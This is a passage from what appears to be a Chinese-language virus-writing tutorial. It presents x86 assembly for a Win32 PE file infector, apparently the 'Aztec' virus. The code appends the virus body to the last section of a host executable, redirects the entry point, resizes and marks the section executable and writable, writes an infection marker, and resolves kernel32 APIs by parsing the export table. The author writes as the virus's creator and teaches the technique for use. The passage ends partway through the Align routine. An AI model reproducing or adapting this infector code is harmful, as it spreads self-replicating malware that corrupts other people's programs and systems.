
```asm
add     edx,[esi+14h]                   ; EDX = EDX+PointerToRawData

push    edx                             ; 保存 EDX

mov     eax,ebx                         ; EAX = EBX

add     eax,[esi+0Ch]                   ; EAX = EAX+VA 地址

                                                ; EAX = 新 EIP

mov     [edi+28h],eax                   ; 改变新的 EIP

mov     dword ptr [ebp+NewEIP],eax      ; 还保存它
```

；---------------------------------------------------------------------------

； 首先我们给`EAX`赋我们正在感染的文件的`EIP`值，为了后面把旧`EIP`赋给一个变量，将会在

； 病毒(你将会看到)的开始用到。我们对基址同样这么做。然后，我们给`EDX`赋最后一节的

； 的`SizeOfRawData`赋给`EDX`，再赋给`EDX`，然后，我们把`EDX`加上`PointerToRawData`(`EDX`

； 将在复制病毒的时候用到所以我们把它保存到堆栈中)。在这之后，我们给`EAX`赋`SizeOfRawData`，

； 把它加上`VA`地址 :所以我们在`EAX`中得到的是主体的新`EIP`。所以我们把它保存在它的`PE`头

； 的域中，并保存在另外一个变量中(看看病毒的开始处)。

；---------------------------------------------------------------------------

```asm
mov     eax,[esi+10h]                   ; EAX = 新的 SizeOfRawData

add     eax,virus_size                  ; EAX = EAX+VirusSize

mov     ecx,[edi+3Ch]                   ; ECX = FileAlignment(文件对齐)

call    Align                           ; 对齐!

mov     [esi+10h],eax                   ; 新的 SizeOfRawData

mov     [esi+08h],eax                   ; 新的 VirtualSize

pop     edx                             ; EDX = 指向节尾的原始指针

mov     eax,[esi+10h]                   ; EAX =  新的 SizeOfRawData

add     eax,[esi+0Ch]                   ; EAX = EAX+VirtualAddress

mov     [edi+50h],eax                   ; EAX =  新的 SizeOfImage

or      dword ptr [esi+24h],0A0000020h  ; 设置新的节标志
```

；---------------------------------------------------------------------------

； Ok, 我们做的第一件事是把最后一节的`SizeOfRawData`装载到`EAX`中，然后把病毒的大小

； 加上它。在 `ECX`中，我们装载`FileAlignment`，我们调用`'Align'`函数，所以在`EAX`中，

； 我们将得到对齐后的`SizeOfRawData+VirusSize`。

； 让我们看看一个小例子:

；

；      `SizeOfRawData` - 1234h

；      `VirusSize`     -  400h

；      `FileAlignment` -  200h

；

； 所以，`SizeOfRawData + VirusSize` 将为1634，在对那个值对齐之后将为1800h。简单，哈?

； 所以我们把对齐后的值设为新的`SizeOfRawData`并作为新的`VirtualSize`，这样做之后我们

； 将没有问题了，我们计算新的`SizeOfImage`，也就是新的`SizeOfRawData`和`VirtualAddress`

； 的和。在计算完这个之后，我们把它保存到`PE`头的`SizeOfImage`域中(偏移50h处)。然后，

； 我们按如下设置节的属性:

；

；      00000020h - 节包含代码

；      40000000h - 节可读

；      80000000h - 节可写

；

； 所以，如果我们要应用这三个属性只要把那3个值或（OR）即可，结果将是`A0000020h`。

； 所以，我们还要把他和节的当前属性值进行或，这样我们不必删除旧的：只要加上它们。

；---------------------------------------------------------------------------

```asm
mov     dword ptr [edi+4Ch],"CTZA"      ; 设置感染标志

lea     esi,[ebp+aztec]                 ; ESI = 指向 virus_start 的指针

xchg    edi,edx                         ; EDI = 指向最后一节结尾的指针

                                                ;

add     edi,dword ptr [ebp+MapAddress]  ; EDI = 规范化后指针

mov     ecx,virus_size                  ; ECX = 要复制的大小

rep     movsb                           ; 做它!

jmp     UnMapFile                       ; 解除映射, 关闭, 等等.
```

；---------------------------------------------------------------------------

； 为了避免重复感染文件我们现在所做的首先是在`PE`头没有用过地方设置感染的标志(偏移

； 4Ch是保留的)。然后，在`ESI`中放一个指向病毒开始的指针。在我们把`EDX`的值赋给`ESI`

； (记住：`EDX`=旧的 `SizeOfRawData+PointerToRawData`)之后，那就是我们放置病毒代码

； 的`RVA`。正如我已经说过了，它是一个`RVA`，这一点你必须知道;)`RVA`必须转换成`VA`，

； 这是通过把`RVA`加上相对值实现的... 所以，它和开始映射文件的地址(如果你还记得，它是

； 由`MapViewOfFile`这个`API`返回的)相关。所以，最后，在`EDI`中我们得到的是写病毒代码的

； `VA`。在`ECX`中，我们装入病毒的大小，并复制。所有都做好了!:)现在我们关闭所有...

；---------------------------------------------------------------------------

```asm
NoInfect:

dec     byte ptr [ebp+infections]

mov     ecx,dword ptr [ebp+WFD_nFileSizeLow]

call    TruncFile
```

；---------------------------------------------------------------------------

； 在感染的时候，如果有什么错误发生，我们就到了这个地方。我们把感染计数器减1，把文件

； 截去感染之前的大小。我希望我们的病毒不会到达这个地方:)

；---------------------------------------------------------------------------

```asm
UnMapFile:

push    dword ptr [ebp+MapAddress]      ; 关闭映射的地址

call    [ebp+_UnmapViewOfFile]

CloseMap:

push    dword ptr [ebp+MapHandle]       ; 关闭映射

call    [ebp+_CloseHandle]

CloseFile:

push    dword ptr [ebp+FileHandle]      ; 关闭文件

call    [ebp+_CloseHandle]

CantOpen:

push    dword ptr [ebp+WFD_dwFileAttributes]

lea     eax,[ebp+WFD_szFileName]        ; 设置原先文件的的属性

push    eax

call    [ebp+_SetFileAttributesA]

ret
```

；---------------------------------------------------------------------------

； 这块代码集中于关闭在感染的时候打开的所有东西：映射地址，映射自身，文件，随后把

； 原先的属性设置回去。

； 让我们看看这里用到的`API`：

；

； `UnmapViewOfFile` 函数从调用进程的地址空间中解除文件的映射。

；

； `BOOL UnmapViewOfFile(`

；   `LPCVOID lpBaseAddress`       // 开始映射的地址

；  `);`

；

； 参数

； ====

；

； `?lpBaseAddress`: 指向要解除映射的文件的基址。这个值必须是由先前调用`MapViewOfFile`

；   或`MapViewOfFileEx`函数返回的值。

；

； 返回值

； =====

；

； `?如果函数调用成功，返回值是非0值，而且所有指定范围内的页将会标志"lazily"`。

；

； `?如果函数调用失败，返回值是0。为了获得详细的错误信息，调用GetLastError函数`。

；

； ---

；

； `CloseHandle` 函数关闭一个打开对象的句柄。

；

； `BOOL CloseHandle(`

；   `HANDLE hObject`      // 要关闭对象的句柄

；  `);`

；

； 参数

； ====

；

； `?hObject`: 指一个打开对象的句柄。

；

；  返回值

；  ======

；

； `?如果函数调用成功，返回值是非0值`。

； `?如果函数调用失败，返回值是0。想要获得详细的错误信息，调用GetLastError`。

；

；---------------------------------------------------------------------------

```asm
GetK32          proc

_@1:    cmp     word ptr [esi],"ZM"

        jz      WeGotK32

_@2:    sub     esi,10000h

        loop    _@1

WeFailed:

        mov     ecx,cs

        xor     cl,cl

        jecxz   WeAreInWNT

        mov     esi,kernel_

        jmp     WeGotK32

WeAreInWNT:

        mov     esi,kernel_wNT

WeGotK32:

        xchg    eax,esi

        ret

GetK32          endp
```

```asm
GetAPIs         proc

@@1:    push    esi

        push    edi

        call    GetAPI

        pop     edi

        pop     esi

        stosd

        xchg    edi,esi

        xor     al,al

@@2:    scasb

        jnz     @@2

        xchg    edi,esi

@@3:    cmp     byte ptr [esi],0BBh

        jnz     @@1

        ret

GetAPIs         endp
```

```asm
GetAPI          proc

        mov     edx,esi

        mov     edi,esi

        xor     al,al

@_1:    scasb

        jnz     @_1

        sub     edi,esi                         ; EDI = API 的名字大小

        mov     ecx,edi

        xor     eax,eax

        mov     esi,3Ch

        add     esi,[ebp+kernel]

        lodsw

        add     eax,[ebp+kernel]

        mov     esi,[eax+78h]

        add     esi,1Ch

        add     esi,[ebp+kernel]

        lea     edi,[ebp+AddressTableVA]

        lodsd

        add     eax,[ebp+kernel]

        stosd

        lodsd

        add     eax,[ebp+kernel]

        push    eax                             ; mov [NameTableVA],eax   =)

        stosd

        lodsd

        add     eax,[ebp+kernel]

        stosd

        pop     esi

        xor     ebx,ebx

@_3:    lodsd

        push    esi

        add     eax,[ebp+kernel]

        mov     esi,eax

        mov     edi,edx

        push    ecx

        cld

        rep     cmpsb

        pop     ecx

        jz      @_4

        pop     esi

        inc     ebx

        jmp     @_3

@_4:

        pop     esi

        xchg    eax,ebx

        shl     eax,1

        add     eax,dword ptr [ebp+OrdinalTableVA]

        xor     esi,esi

        xchg    eax,esi

        lodsw

        shl     eax,2

        add     eax,dword ptr [ebp+AddressTableVA]

        mov     esi,eax

        lodsd

        add     eax,[ebp+kernel]

        ret

GetAPI          endp
```

；---------------------------------------------------------------------------

； 上面所有的代码以前已经见过了，这里是有了一点点优化，所以你可以看看你自己用其它

； 方法该怎么做。

；---------------------------------------------------------------------------

； 输入:

；      `EAX` - 对齐的值

；      `ECX` - 对齐因子

； 输出:

；      `EAX` - 对齐值

```asm
Align           proc

        push    edx

        xor     edx,edx

        push    eax

        div     ecx

        pop     eax

        sub     ecx,edx

        add     eax,ecx
```
